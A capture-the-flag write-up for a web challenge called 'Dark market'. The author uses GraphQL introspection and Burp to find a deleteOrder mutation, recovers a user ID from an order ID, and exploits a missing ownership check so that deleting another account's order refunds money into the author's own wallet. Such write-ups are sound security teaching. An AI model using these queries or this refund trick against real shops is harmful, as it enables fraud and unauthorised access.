## Dark Market

### Challenge
```
Dark market - Web (300 + 0)

You need to up your game before you go dumpster diving again, they'll trace you like THAT, man! Buy a subway defense system at defense.alieni.se:3002.

Service: http://defense.alieni.se:3002/
```

### Topics and Tools
- graphql
- burp


So right off the bat, we're given a Log In page and a Products page. After checking the Products page, I noticed that there's a Flare Gun with the description:
> Our best defense system, recommended for usage in quick escapes. Perfect for dumpster diving.

Considering the challenge mentions dumpster diving, I assumed that I would need to buy a flare gun (which costs $110).

I registered for an account and was greeted with the following:

![HomePageSS](https://i.imgur.com/9Vv2wJG.png)

I had $100, but needed $110 which was unfortunate. So instead of a flare gun, I bought myself some pepper spray. This gave me an Order ID of `9fcdcedb-f15f-4759-b6d4-dfbe2419a0fc`.

Over on the OrderStatus page, there is a text field that takes in an Order ID and spits out the ordered item.  Viewing the source on this page gives us some interesting information:

```
function searchOrder(){
		searchResult.innerText = "searched for "+search.value
	}

	var orderSearch = `
	query fetchOrder($searchTerm: String!) {
	  findOrder(orderId: $searchTerm) {
	    productId
	  }
	}`

	var productSearch = `
	query fetchProduct($searchTerm: Int!) {
		findProduct(productId: $searchTerm) {
			name
			desc
			image
			price
		}
	}`

	function searchOrder() {
		var searchTerm = search.value;
		var payload = {
			query: orderSearch,
			variables: JSON.stringify({
				searchTerm: searchTerm,
			})
		}

		$.post("/graphql", payload, function(response) {
			if (response.errors || response.data.findOrder == null) {
				searchResult.innerText = "ERROR";
			} else {
				searchTerm = response.data.findOrder.productId;
				payload = {
						query: productSearch,
						variables: JSON.stringify({
							searchTerm: searchTerm,
						})
					};
				$.post("/graphql", payload, function(response){
					if (response.errors){
						searchResult.innerText = "ERROR";
					}else{
						product = response.data.findProduct;
						searchResult.innerHTML = `
						<TABLE BORDER="1">
							<TR>
							...
```

So it looked like a graphql interface was being hit for all database transactions. It was time to fire up burp and dig into this database.

First thing on the list was to get the entire database schema. This is easily done using the query found here: https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da
After submitting this, I got the whole schema which can be found at: [graphql schema](database_schema.json)

![BurpSchema](https://i.imgur.com/AB7PJDb.png)

Diving into this schema, I noticed that there are three ways we can interact with data: findOrder, findProduct, and deleteOrder. findOrder and findProduct are defined as query objects, and deleteOrder is defined as mutation.

findOrder
```
              "name": "findOrder",
              "description": null,
              "args": [
                {
                  "name": "orderId",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "String",
                    "ofType": null
                  },
                  "defaultValue": null
                }
 ```

findProduct
 ```
               "name": "findProduct",
              "description": null,
              "args": [
                {
                  "name": "productId",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "Int",
                    "ofType": null
                  },
                  "defaultValue": null
                }
 ```

 deleteOrder
 ```
          "kind": "OBJECT",
          "name": "MyMutations",
          "description": null,
          "fields": [
            {
              "name": "deleteOrder",
              "description": null,
              "args": [
                {
                  "name": "orderId",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "String",
                    "ofType": null
                  },
                  "defaultValue": null
                },
                {
                  "name": "userId",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "Int",
                    "ofType": null
                  },
                  "defaultValue": null
                }
              ],
              "type": {
                "kind": "OBJECT",
                "name": "deleteOrder",
                "ofType": null
              },
 ```

 A bit further down is the deleteOrder Object schema

 ```
           "kind": "OBJECT",
          "name": "deleteOrder",
          "description": null,
          "fields": [
            {
              "name": "success",
              "description": null,
              "args": [],
              "type": {
                "kind": "SCALAR",
                "name": "Boolean",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
```

 Another key part of the database is at the top:
 ```
       "mutationType": {
        "name": "MyMutations"
      },
 ```

 This is saying that it will take mutations under MyMutations, which deleteOrder is. It's also saying that the deleteOrder mutation will return a deleteOrder object which has a subfield of boolean "success".

 For some more reading on mutations, I recommend: https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4


 I had already seen findOrder and findProduct in the source of the Order Status page, so deleteOrder seemed to be the new piece. deleteOrder is a mutation that takes two arguments, an orderId and a userId and can be called with:

 ```
 mutation{
    deleteOrder(orderId: "some_order_id_string", userId : some_user_id_int)
    {
        success
    }
}
 ```


At this point I was missing one key piece to be able to run this query: the userId.
With a well formed query, it's possible to get the UserId from an OrderId

```
query= {
	findOrder (orderId: "9fcdcedb-f15f-4759-b6d4-dfbe2419a0fc")
	{
		user
		{
			id
			name
		}
	}
}
```

Which returned

```
{"data":{"findOrder":{"user":{"id":"VXNlcnM6MjE0Nw==","name":"reznokwriteup"}}}}
```

The ID is base64 encoded, and that decoded to: `Users:2147`

I now had a userId and an orderId and it was time to delete some orders.

![BurpDeleteOrder](https://i.imgur.com/d7iZs24.png)

Got a success message and then confirmed that my order did indeed get deleted and my **money was refunded to my wallet.**

I was stuck here for a while until I had a crazy idea. What if the deleteOrder wasn't checking that the orderId and userId were actually tied to each other? This could potentially allow me to get more than $100.

This was easy enough to test, so I went for it. I made a new user account, bought myself some brass knuckles on it, and was given the orderId of: 337894b5-f8ff-4923-8b6a-b0fd9f77154d.
I Plugged that orderId into the same deleteOrder query so that it was the orderId from the new account and the userId from the old account:

![BurpDeleteOrder2](https://i.imgur.com/3GlHvxJ.png)

It appeared to have worked. Then on my original account, I checked my wallet:
![MoneyMoney](https://i.imgur.com/LExkj0d.png)

It worked!

I went and bought myself a fancy new flare gun and was greeted with the flag.

![Flag](https://i.imgur.com/hfT72X7.png)

























